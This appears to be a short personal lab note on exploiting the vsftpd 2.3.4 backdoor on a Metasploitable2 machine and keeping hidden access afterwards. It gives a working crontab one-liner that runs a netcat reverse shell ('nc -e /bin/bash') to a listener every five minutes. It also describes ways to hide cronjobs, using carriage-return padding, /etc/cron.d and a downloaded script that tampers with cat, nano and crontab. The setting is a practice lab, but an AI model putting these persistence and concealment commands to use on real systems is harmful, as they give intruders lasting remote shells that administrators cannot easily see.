VSFTPD 2.3.4

1) Vulnerable to a backdor lcoated on the installer (.tar) of the protocol
2) Using metasploit module we obtain a shell than upgraded to meterpeter just for QoF
3) Full usable TTY
4) Wanna use a cronjob to create a persistente backdoor using cronjob

THIS OVERRIDE OTHER ENTRIES

(crontab -l 2>/dev/null; echo "*/5 * * * * nc -e /bin/bash 192.168.41.128 50032") | crontab -


5) Open the listener to the specified port and wait MAX 5min and get the shell.......COOL!


I was looking for method to hide ourself and our cronjob and after a short period of time on metasplotaible2 terminal 
on root user appear the message "You got a new email in /var/mail/root" with a message that they discovered our cronjobs

Good thing we can move for what I was looking for

Different way to hide a cronjob :
	
	A] carriage return (hide only in the file but can be usefull on the go)
		ex :/ echo -e "*/15 * * * * /root/bd.sh #\r                           " >>/etc/crontab
		the number of spaces have to be same number of the string this prevent to be showed by cat and crontab -l
		worked but in cat show just a empty line can be sketchy but is rewarding
	
	B] instead to put it on explicit crontab file use /etc/cron.d that doesnt display on crontabs -e/-r good 
	   to use with A (combo)

	C] I found a simple script that go to make some simple but effective changes on nano, cat and crontab
 	        wget https://raw.githubusercontent.com/Brets0150/CG_RedTeamTools/main/cg_cron_cloaks.sh 
	   just some changes to adapt at my reverse shell with nc, insert the cronjob and we make the trick
           

Obv this are considered just as primary layer and easy hexdump or a reset of the functions that going to be changed after the step C
